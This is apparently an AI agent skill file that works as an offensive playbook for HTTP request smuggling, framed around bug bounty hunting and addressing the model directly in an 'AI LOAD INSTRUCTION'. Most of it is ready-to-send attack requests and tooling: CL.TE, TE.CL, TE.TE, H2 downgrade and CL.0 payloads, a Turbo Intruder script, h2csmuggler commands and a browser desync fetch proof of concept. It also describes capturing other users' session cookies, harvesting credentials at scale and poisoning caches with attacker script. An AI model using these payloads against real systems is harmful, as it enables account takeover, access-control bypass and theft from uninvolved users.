---
name: request-smuggling
description: HTTP request smuggling — CL.TE/TE.CL/H2.TE/H2.CL variants, detection (timing-based, differential response), exploitation (bypassing front-end controls, capturing credentials, response queue poisoning, web cache poisoning, host header injection via smuggled request), and Turbo Intruder/h2csmuggler tooling.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: HTTP Request Smuggling — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: HTTP request smuggling exploits disagreements between front-end (load balancer/proxy) and back-end servers on where HTTP request bodies end. Modern variants include H2.TE and H2.CL (HTTP/2 downgrade). Base models often miss: (1) the confirmation step before exploitation, (2) H2 variants that bypass TE obfuscation defenses, (3) the response desync attack direction. Always confirm before attempting to poison.

## 0. RELATED ROUTING

- http2-specific-attacks — H2-specific techniques (single-packet race, h2c smuggling, header injection)
- web-cache-deception — combine smuggling with cache poisoning for wider impact
- auth — bypass authentication via smuggled requests

---

## 1. VULNERABILITY TYPES

| Type | Front-End Uses | Back-End Uses | Attack Vector |
|---|---|---|---|
| **CL.TE** | Content-Length | Transfer-Encoding | Smuggle via TE body |
| **TE.CL** | Transfer-Encoding | Content-Length | Smuggle via oversized CL |
| **TE.TE** | Transfer-Encoding | Transfer-Encoding | Obfuscate TE header |
| **H2.TE** | HTTP/2 (no framing) | TE header | Inject TE in H2 headers |
| **H2.CL** | HTTP/2 (no framing) | Content-Length | Inject CL mismatch in H2 |
| **H2.0** | HTTP/2 | HTTP/1 (no length) | CRLF injection in h2 headers |

---

## 2. DETECTION (TIMING-BASED)

### CL.TE Timing Test

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

- **CL.TE vulnerable**: back-end waits for more data after `X` → **10+ second delay**
- Not vulnerable: responds normally

### TE.CL Timing Test

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

- **TE.CL vulnerable**: back-end waits for `X` byte from Content-Length → **10+ second delay**

> **Important**: Send these tests with `Connection: close` and disable request grouping in Burp.

---

## 3. CL.TE EXPLOITATION

Front-end uses Content-Length, back-end uses Transfer-Encoding.

### Basic Smuggle Structure

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggled&x=
0

GET /admin HTTP/1.1
Foo: x
```

The back-end sees two requests:
1. `POST /` with body `q=smuggled&x=`
2. `GET /admin HTTP/1.1` (smuggled)

### Bypass Front-End Access Control

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 112
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

x=hello
```

---

## 4. TE.CL EXPLOITATION

Front-end uses Transfer-Encoding, back-end uses Content-Length.

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

> **Note**: The chunk size `87` must equal the exact byte count of the smuggled request.

---

## 5. TE.TE (OBFUSCATION)

Both servers support TE, but one ignores obfuscated variants.

```http
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: [tab]chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

Send the attack as CL.TE or TE.CL depending on which server ignores the obfuscated form.

---

## 6. H2.TE / H2.CL (HTTP/2 DOWNGRADE)

When a front-end accepts HTTP/2 but back-end is HTTP/1.1.

### H2.TE Attack (Inject TE header into H2 request)

```
:method POST
:path /
:authority target.com
content-type application/x-www-form-urlencoded
transfer-encoding chunked

0

GET /admin HTTP/1.1
Host: target.com
Content-Length: 10

smuggled=x
```

**Burp Suite**: Send in HTTP/2, insert `transfer-encoding: chunked` as a custom header in Inspector.

### H2.CL Attack (CL mismatch)

```
:method POST
:path /
:authority target.com
content-length 0

GET /admin HTTP/1.1
Host: target.com
```

---

## 7. CAPTURING OTHER USERS' REQUESTS

```http
POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Transfer-Encoding: chunked

0

POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 800

comment=
```

The next victim's request is appended to the `comment=` parameter, capturing their session cookies/headers.

---

## 8. RESPONSE QUEUE POISONING (H2)

Cause two responses to be served to the wrong users.

```
Attack via H2.TE:
1. Smuggle a complete GET /admin request inside the body
2. First attacker response: normal 200 OK for POST /comment
3. Second attacker response: admin response (poison)
4. Next victim receives poisoned response meant for admin
```

---

## 9. CONFIRMING VULNERABILITY SAFELY

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 51
Transfer-Encoding: chunked

0

GET /hopefully404 HTTP/1.1
Foo: x
```

If the **next** normal response from anyone returns 404, the smuggle worked without causing harm.

---

## 10. TOOLING

### Burp Suite

```
1. Enable HTTP Request Smuggler extension
2. Smuggler > Scan for smuggling
3. Repeater: set "Duplicate Content-Length" for manual testing
4. Turn off Update Content-Length in HTTP tab
```

### Turbo Intruder (Python)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False)
    
    smuggle = """POST / HTTP/1.1\r
Host: TARGET\r
Content-Length: 83\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /admin HTTP/1.1\r
Host: TARGET\r
Content-Length: 10\r
\r
smuggled="""
    
    engine.queue(smuggle, pauseTime=200)

def handleResponse(req, interesting):
    table.add(req)
```

### h2csmuggler

```bash
pip install h2csmuggler

# Scan for h2c upgrade vulnerability:
h2csmuggler --scan-list targets.txt

# Exploit:
h2csmuggler -x https://target.com \
  -d ':method: GET' \
  -d ':path: /admin' \
  -d ':scheme: https' \
  -d ':authority: target.com'
```

---

## 11. EXPLOITATION DECISION TREE

```
Identify entry point (CDN / load balancer / WAF proxy):
│
├── Does proxy support HTTP/2?
│   ├── Yes → Test H2.TE, H2.CL (most likely modern setup)
│   └── No → Test H1 variants (legacy infrastructure)
│
├── CL.TE timing test: 10s delay?
│   └── Yes → Test CL.TE exploitation path
│
├── TE.CL timing test: 10s delay?
│   └── Yes → Test TE.CL exploitation path
│
└── Both respond normally → Try TE.TE obfuscation variants

What to exploit:
├── Can access admin paths from front-end? → Bypass access control
├── Log body endpoint (comments, search)? → Capture other users' requests
├── Cache involved? → Response queue poison or cache poison
└── OAuth callback via HOST header? → Host header injection via smuggled request
```

## From hack-skills: Advanced Request Smuggling Techniques

### Client-Side Desync (Browser Fetch Pipelines)

**Scenario**: browser's `no-cors` fetch sends a request whose body bytes cause the origin to misparse boundaries — no front-proxy needed.

```javascript
// JavaScript PoC (browser + no-cors + credentials)
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**When this works**: server supports HTTP/1.1 keep-alive and has a CL/TE ambiguity reachable from browser fetch without a preflight (no custom headers, no JSON content-type). Success shows as side effects on other requests over the same connection.

### TE.TE — All 8 Obfuscation Variants

Both front and back support TE, but differ on which variant they accept as valid chunked:

```http
Transfer-Encoding: xchunked
```
```http
Transfer-Encoding : chunked
```
```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```
```http
Transfer-Encoding: x
```
```http
Transfer-Encoding:[TAB]chunked
```
(Replace [TAB] with real `\x09` byte.)
```http
 Transfer-Encoding: chunked
```
(One leading space before header name.)
```http
X: X
Transfer-Encoding: chunked
```
(Prior line value is `X`; lenient parsers may merge lines.)
```http
Transfer-Encoding
: chunked
```
(Field name and colon on separate physical lines; some parsers accept this.)

**Strategy**: for each (front, back) pair, determine which side accepts which variant as `chunked`. Map to equivalent CL.TE or TE.CL attack direction.

### H2 Downgrade — Pseudo-Header Injection

When edge accepts HTTP/2 but origin uses HTTP/1.1, inject TE header or CRLF-encoded request inside H2 header value:

```
Inject into H2 header value:
  header-name: ignored-value\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

If the H2→H1 translation layer writes header values verbatim, the CRLF sequence splits the reconstructed H1 stream at the origin — without any CL/TE header needed. Test: embed `\r\n\r\nGET /admin HTTP/1.1\r\nHost: target` inside a header value via Burp Inspector.

### CL.0 (Connection-Close Desync)

The origin terminates the connection after a 0-byte body is consumed via `Content-Length: 0`, but the front-end buffers the remaining bytes for the next request on the same connection:

```http
POST /keepalive HTTP/1.1
Host: target.example
Content-Length: 0
Connection: keep-alive

GET /admin HTTP/1.1
Host: target.example
```

No chunked encoding required. Works when front-end reuses connections but back-end closes on `Content-Length: 0`.

### Confirm Without Collateral

Safe confirmation probe — smuggle a request to a 404 path:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 51
Transfer-Encoding: chunked

0

GET /hopefully404 HTTP/1.1
Foo: x
```
If the **next** normal request returns 404, the smuggle worked. Never smuggle sensitive paths during confirmation.


---

## Hunt Methodology (Claude-BugHunter — real BB reports)

## 17. HTTP REQUEST SMUGGLING
> Lowest dup rate. $5K–$30K. PortSwigger research by James Kettle.

### CL.TE (Content-Length front, Transfer-Encoding back)
```http
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### Detection
```
1. Burp extension: HTTP Request Smuggler
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. Manual timing: CL.TE probe + ~10s delay = backend waiting for rest of body
```

### Impact Chain
```
Poison next request → access admin as victim
Steal credentials → capture victim's session
Cache poisoning → stored XSS at scale
```

---

## Target-Suitability Matrix (2026 reality check)

The classic CL.TE / TE.CL payloads are NOT universally exploitable in 2026. Modern proxies are RFC 9112 strict by default. Fingerprint the front-end BEFORE investing time.

| Front-end | CL.TE | TE.CL | H2.CL | H2.TE | Notes |
|---|---|---|---|---|---|
| **Nginx ≥ 1.21** | NO | NO | partial (H2 ingress) | partial | RFC-strict; rejects CL+TE with HTTP 400. Verified locally on Nginx 1.27 — all 9 documented variants killed by front-end ([docs/verification/phase2h-smuggling-cachepoison.md](../../docs/verification/phase2h-smuggling-cachepoison.md)). |
| **Caddy 2.x** | NO | NO | — | — | Hardened by default |
| **Envoy ≥ 1.20** | NO | NO | partial | partial | Hardened in most paths |
| **HAProxy ≤ 2.4** | ✓ | ✓ | — | — | **Vulnerable**, see CVE-2021-40346 |
| **AWS ALB + specific upstream** | partial | partial | ✓ | ✓ | Several disclosed-paid reports 2022-2024 |
| **Cloudflare → S3 / Lambda chains** | — | — | ✓ | ✓ | H2-downgrade attacks remain viable |
| **Older F5 BIG-IP (TMM < 16)** | ✓ | — | — | — | Vendor advisories |
| **Citrix ADC / NetScaler (older firmware)** | ✓ | ✓ | — | — | Disclosed in 2020-2022 |
| **Squid 3.x** | ✓ | — | — | — | Older deployments |
| **Apache Traffic Server (older)** | ✓ | ✓ | ✓ | ✓ | PortSwigger research |
| **Apache mod_proxy_ajp → Tomcat** | — | — | — | — | Cross-protocol HTTP→AJP desync (CVE-2022-26377); smuggled request is opaque to the WAF and reaches internal AJP admin/status paths that lack the external auth controls |
| **Custom Python / Go proxies** | ✓ | ✓ | — | — | Frequently miss RFC enforcement |

### Operator fingerprint quick-check

```bash
curl -sI https://target/ | grep -i "Server:"
```

- `nginx/1.21+`, `Caddy`, `envoy` → CL/TE classic is dead — pivot to H2.CL/H2.TE if the front-end speaks HTTP/2, or look for legacy proxies upstream
- `HAProxy`, header points to AWS/CDN → run the full payload matrix
- No Server header → assume hardened, but run a single quick `space-before-colon` probe; if it doesn't 400, dig deeper

### H2.CL / H2.TE (the modern dominant vector)

H2-downgrade smuggling attacks rely on the front-end speaking HTTP/2 to the client and HTTP/1.1 to origin. The downgrade introduces CL/TE confusion because HTTP/2's frame-length headers don't survive the conversion cleanly. Most CDN+origin chains in 2024-2026 use this exact topology.

Tools that send HTTP/2 raw frames (Burp Pro's HTTP Request Smuggler extension, `h2csmuggler`, `smuggler.py`) are the right starting point against CDN-fronted targets. Avoid HTTP/1.1-only test clients (curl, raw sockets) against H2-front-ended targets — you'll send the wrong protocol entirely.

### Mass credential harvesting — the "collector gadget"
The highest-impact smuggling outcome needs no per-victim interaction. Instead of blindly poisoning the queue, smuggle a request aimed at a **back-end handler that echoes the full request** — a search endpoint that reflects headers, or a redirect that mirrors the request line. The next victim's headers (`Cookie`, `Authorization`, `X-Access-Token`) get attributed to your smuggled request, and the reflecting handler returns them **in a response you read**. Repeated on a busy keep-alive socket, this harvests live credentials from arbitrary users at scale — and it works even through a CDN (Akamai/Cloudflare) when the CDN↔origin hop desyncs. Chains to `hunt-ato`.

---

## Related Skills & Chains

- **`hunt-cache-poison`** — Smuggling + cache is the canonical critical chain; one smuggled request becomes the cached response for every subsequent victim. Chain primitive: CL.TE smuggle a request whose response body contains attacker HTML/JS → front-end cache stores it under a popular URL (`/`, `/login`) → de-sync poisoning where the smuggled request becomes the cached response for the next N victims, persisting for the cache TTL.
- **`hunt-auth-bypass`** — Smuggling reaches internal-only routes that the front-end WAF/auth-proxy filters out. Chain primitive: smuggle `GET /admin/users HTTP/1.1` past the front-end ACL that blocks external `/admin/*` → backend processes the smuggled request as if from a trusted internal source → bypass front-end auth by smuggling internal-routed request → admin data in the response queue.
- **`hunt-idor`** — Smuggling attaches the NEXT user's session cookies to an attacker-controlled request path. Chain primitive: smuggle `GET /api/me HTTP/1.1` with no cookies → backend pairs it with the next legitimate user's incoming connection cookies → victim's session cookie attached to attacker's smuggled request → attacker reads the response containing victim's PII/tokens.
- **`hunt-xss`** — Smuggling injects XSS payloads into the response stream of the next victim without ever appearing in a URL parameter. Chain primitive: smuggled request body contains reflected payload that the backend renders into the next response in the queue → next visitor to `/` receives attacker HTML inline → reflected XSS at every visitor without any URL parameter visible to them or to logs.
- **`security-arsenal`** — Reach for the smuggling payload bank (CL.TE / TE.CL / TE.TE obfuscations, H2.CL downgrade probes, h2csmuggler one-liners, Burp HTTP Request Smuggler extension config) and the time-delay confirmation template before manual hex-editing.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: the smuggled-request effect MUST land on a request issued by a different client/session, not your own follow-up. A timing delta in your own browser alone is parser disagreement, not exploitable smuggling.



